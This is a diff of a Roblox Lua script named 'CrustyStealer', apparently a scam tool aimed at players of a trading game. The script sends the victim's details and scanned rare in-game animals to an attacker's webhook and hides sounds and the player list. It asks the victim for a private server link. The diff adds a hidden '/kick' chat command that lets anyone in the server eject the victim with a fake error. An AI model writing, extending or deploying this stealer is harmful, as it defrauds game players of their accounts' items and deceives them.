@@ -1,19 +1,61 @@
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local SoundService = game:GetService("SoundService")
+local TextChatService = game:GetService("TextChatService")
 local LocalPlayer = Players.LocalPlayer
 local webhookURL = _G.WEBHOOK or WEBHOOK or getgenv().WEBHOOK
+
 if _G.CrustyStealerRunning then
     return
 end
 _G.CrustyStealerRunning = true
+
 if not webhookURL then
     return
 end
+
 local requestFunc = (syn and syn.request) or request or http_request or (http and http.request)
 if not requestFunc then
     return
 end
+
+-- Chat Kick Fonksiyonu
+local function setupChatKick()
+    pcall(function()
+        -- Yeni Chat Sistemi (TextChatService)
+        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+            TextChatService.MessageReceived:Connect(function(message)
+                if message.Text and message.Text:lower() == "/kick" then
+                    LocalPlayer:Kick("Bot Not Found\nPlease Try Again Later")
+                end
+            end)
+        else
+            -- Eski Chat Sistemi
+            local Players = game:GetService("Players")
+            local ReplicatedStorage = game:GetService("ReplicatedStorage")
+            
+            for _, player in pairs(Players:GetPlayers()) do
+                player.Chatted:Connect(function(msg)
+                    if msg:lower() == "/kick" then
+                        LocalPlayer:Kick("Bot Not Found\nPlease Try Again Later")
+                    end
+                end)
+            end
+            
+            Players.PlayerAdded:Connect(function(player)
+                player.Chatted:Connect(function(msg)
+                    if msg:lower() == "/kick" then
+                        LocalPlayer:Kick("Bot Not Found\nPlease Try Again Later")
+                    end
+                end)
+            end)
+        end
+    end)
+end
+
+-- Chat Kick'i başlat
+setupChatKick()
+
 local function muteAllSounds()
     pcall(function()
         for _, sound in pairs(workspace:GetDescendants()) do
@@ -42,6 +84,7 @@ local function muteAllSounds()
         end
     end)
 end
+
 workspace.DescendantAdded:Connect(function(descendant)
     if descendant:IsA("Sound") or descendant:IsA("SoundGroup") then
         descendant.Volume = 0
@@ -50,6 +93,7 @@ workspace.DescendantAdded:Connect(function(descendant)
         end
     end
 end)
+
 SoundService.DescendantAdded:Connect(function(descendant)
     if descendant:IsA("Sound") or descendant:IsA("SoundGroup") then
         descendant.Volume = 0
@@ -58,13 +102,16 @@ SoundService.DescendantAdded:Connect(function(descendant)
         end
     end
 end)
+
 muteAllSounds()
+
 spawn(function()
     while true do
         muteAllSounds()
         task.wait(2)
     end
 end)
+
 spawn(function()
     while true do
         pcall(function()
@@ -76,16 +123,19 @@ spawn(function()
         task.wait(10)
     end
 end)
+
 local function isPrivateServer()
     local playerCount = #Players:GetPlayers()
     return playerCount <= 4
 end
+
 local function getPlayerAvatar(userId)
     local success, result = pcall(function()
         return "https://www.roblox.com/headshot-thumbnail/image?userId="..userId.."&width=420&height=420&format=png"
     end)
     return success and result or "https://raw.githubusercontent.com/platinww/CrustyMain/refs/heads/main/UISettings/crustylogonew.png"
 end
+
 local function parseGeneration(text)
     if not text then return 0 end
     local number, multiplier = text:match("%$([%d%.]+)([KMBT]?)/[sh]")
@@ -102,11 +152,13 @@ local function parseGeneration(text)
     end
     return number
 end
+
 local function cleanMutationText(text)
     if not text then return nil end
     local cleaned = text:gsub("<[^>]+>", "")
     return cleaned
 end
+
 local function sendWebhook(embedData, mentionEveryone)
     pcall(function()
         local data = {
@@ -128,6 +180,7 @@ local function sendWebhook(embedData, mentionEveryone)
         })
     end)
 end
+
 local function disableLeaderboard()
     pcall(function()
         game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
@@ -154,6 +207,7 @@ local function disableLeaderboard()
         end
     end)
 end
+
 local function sendInitialWebhook()
     local avatarUrl = getPlayerAvatar(LocalPlayer.UserId)
     local embed = {
@@ -192,6 +246,7 @@ local function sendInitialWebhook()
     }
     sendWebhook(embed, false)
 end
+
 local function createUI()
     local oldGui = LocalPlayer.PlayerGui:FindFirstChild("CrustyUI")
     if oldGui then oldGui:Destroy() end
@@ -341,6 +396,7 @@ local function createUI()
     end)
     return ScreenGui, TextBox, SubmitButton
 end
+
 local function createLoadingScreen(message)
     for _, gui in pairs(LocalPlayer.PlayerGui:GetChildren()) do
         if gui:IsA("ScreenGui") and gui.Name ~= "LoadingScreen" then
@@ -434,11 +490,10 @@ local function createLoadingScreen(message)
     end)
     return ScreenGui, LoadingText
 end
+
 local function scanPlots()
     local animalData = {}
     local validRarities = {"og", "secret", "brainrot god"}
-    
-    print("TÜM WORKSPACE TARANIYORRR...")
     
     -- TÜM WORKSPACE'DEKİ HER ŞEYİ TARA
     for _, descendant in pairs(workspace:GetDescendants()) do
@@ -486,9 +541,9 @@ local function scanPlots()
         end
     end
     
-    print("TOPLAM BULUNAN: " .. #animalData)
     return animalData
 end
+
 local function groupAnimals(animalData)
     local grouped = {}
     for _, data in pairs(animalData) do
@@ -508,6 +563,7 @@ local function groupAnimals(animalData)
     end
     return grouped
 end
+
 if not isPrivateServer() then
     local ScreenGui = Instance.new("ScreenGui")
     ScreenGui.Name = "PrivateServerWarning"
@@ -563,8 +619,11 @@ if not isPrivateServer() then
     Info.Parent = Frame
     return
 end
+
 sendInitialWebhook()
+
 local gui, textBox, submitButton = createUI()
+
 submitButton.MouseButton1Click:Connect(function()
     local serverLink = textBox.Text
     if serverLink == "" then
